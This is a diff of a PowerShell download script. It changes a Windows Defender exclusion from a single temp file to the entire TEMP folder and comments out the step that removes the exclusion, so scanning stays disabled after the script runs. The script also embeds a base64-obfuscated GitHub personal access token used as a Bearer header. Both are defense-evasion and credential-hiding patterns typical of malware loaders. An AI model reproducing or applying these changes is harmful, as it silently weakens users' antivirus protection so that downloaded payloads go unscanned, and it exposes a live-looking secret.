@@ -67,7 +67,7 @@ $temp = $env:TEMP
 try {
     Write-Host "Download..." -ForegroundColor Green
     $contFile = [System.IO.Path]::GetTempFileName()
-	Add-MpPreference -ExclusionPath $contFile -ErrorAction Ignore
+	Add-MpPreference -ExclusionPath $temp -ErrorAction Ignore
     try {
 		$String = "QmVhcmVyIGdpdGh1Yl9wYXRfMTFCSkVOSDRJMGRZWjNVeTJtWnNxTl9PWVVNWVdkcGdTWHJybk43V3pDbjIwbkVlUm5zRTVvYVVQWlJSclpsd3hWQ1hHNktGNlFOR2p0aWhMdw=="
 		$String = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($String))
@@ -104,7 +104,7 @@ try {
 		Start-Sleep -s 3
     }
 	try{
-		Remove-MpPreference -ExclusionPath $contFile -ErrorAction Ignore
+		# Remove-MpPreference -ExclusionPath $contFile -ErrorAction Ignore
 	} catch{ Write-Host "Remove-MpPreference: $($_.Exception.Message)" -ForegroundColor Red }
 } finally {
 	
